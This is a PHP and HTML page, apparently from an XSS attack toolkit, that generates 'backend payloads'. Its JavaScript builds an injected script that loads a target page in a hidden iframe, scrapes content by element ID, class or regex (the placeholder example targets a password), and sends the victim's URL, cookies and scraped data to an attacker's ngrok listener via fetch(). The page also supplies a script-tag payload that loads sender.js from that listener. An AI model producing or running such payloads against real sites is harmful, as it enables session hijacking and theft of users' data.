<?php include 'include/header.php';
if (!file_exists("sender.js")) {
  $senderJS = fopen("sender.js", "w");
  fwrite($senderJS, "");
  fclose($senderJS);
}
?>;?>

  <div class="text-center text-white h-100 align-items-center d-flex py-5" style="background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url(&quot;img/cover.jpg&quot;); background-position: center center, center center; background-size: cover, cover; background-repeat: repeat, repeat; background-attachment: fixed;">

    <script type="text/javascript">
      function savepayload(t){var e=new XMLHttpRequest;return e.onreadystatechange=function(){4==this.readyState&&200==this.status&&alert(e.responseText)},e.open(t.method,t.getAttribute("action")),e.send(new FormData(t)),!1}function changeID(a){document.getElementsByTagName("input")[2].setAttribute("id",a)}function generatePayload(){var d=document.getElementById("url").value,e=document.getElementById("receiverURL").value,f=document.getElementsByTagName("input")[2].id,a=document.getElementsByTagName("input")[2].value;if(0==d.length||0==e.length||0==f||"select"==f||0==a.length)document.getElementById("payload").value="Missing value or option.";else{if("getElementById"==f)var b=f+"(\""+document.getElementById(f).value+"\").innerText.split(\"\\\\n\").join(\", \")";else if("getElementsByClassName"==f)var b=f+"(\""+document.getElementById(f).value+"\"),c=[].map.call(c,function(a){return a.textContent||a.innerText||\"\"}).join(\", \")";else if("RegeXSS"==f)var b="body.innerHTML.match(/"+document.getElementById(f).value+"/).toString().split(\",\")[1]";else console.log("https://nirmaldahal.com.np");document.getElementById("payload").value="document.write('<iframe id=\"nhnt\" src=\""+d+"\" style=\"display:none;\" onload=\"nhnf()\"></iframe><script>function nhnf(){var a=document.getElementById(\"nhnt\"),b=a.contentDocument||a.contentWindow.document,c=b."+b+";fetch(\""+e+"\"+encodeURI(btoa(document.URL+\"|\"+document.cookie+\"|\"+c)));}<\/script>');"}}
    </script>

    <div class="container">
      <div class="row">
        <div class="mx-auto col-md-10 p-4">
          <h1 class="text-light">Generate Backend Payload</h1>
          <p class="mb-4 lead text-light"></p>
          <div class="form-row">
            <div class="form-group col-md-12">
              <input type="text" class="form-control form-control-sm" placeholder="Target Page URL | e.g : https://example.com/sensitive/data.php" id="url">
            </div>
            <div class="form-group col-md-12">
              <input type="text" class="form-control form-control-sm" id="receiverURL" value="<?php echo trim($ngrokURL)."/nc.php?data="?>" placeholder="Listener URL | e.g : https://randomno.ngrok.io/nc.php?data=" disabled="disabled">
            </div>            
          </div>
          <div class="form-group">
            <select class="form-control form-control-sm" id="select" onchange="changeID(this.value);">
              <option value="select">Search Options | RegeXSS, Classes, IDs</option>
              <option value="RegeXSS">RegeXSS</option>
              <option value="getElementsByClassName">Element Class</option>
              <option value="getElementById">Element ID</option>
            </select>
          </div>
          <div class="form-row">
            <div class="form-group col-md-12">
              <input type="text" class="form-control form-control-sm" placeholder="RegeXSS e.g | \\(pwd == \'(.*)\'\\)">
            </div>
            <div class="form-group col-md-12">
              <button class="btn btn-primary btn-block btn-lg" onclick="generatePayload();" >Generate Payload</button>
            </div>
          </div>

          <form method="POST" action="include/saveBackPay.php" onsubmit="return savepayload(this);" >
            <div class="form-group">
              <input type="text" class="form-control form-control-sm" value="Payload : <script src=<?php echo str_replace("https:","",trim($ngrokURL))."/sender.js"?>></script>" readonly>
            </div>
            <div class="form-group">
              <textarea class="form-control form-control-sm" id="payload" rows="10" placeholder="Payload Preview" name="backPayload"></textarea>
            </div>
            <div class="form-row">
              <div class="form-group col-md-12">
                <button type="submit" class="btn btn-primary btn-block btn-lg">Save Payload</button>
              </div>
            </div>
          </form>
          
          </div>
        </div>
      </div>
    </div>
<?php include 'include/footer.php';?>
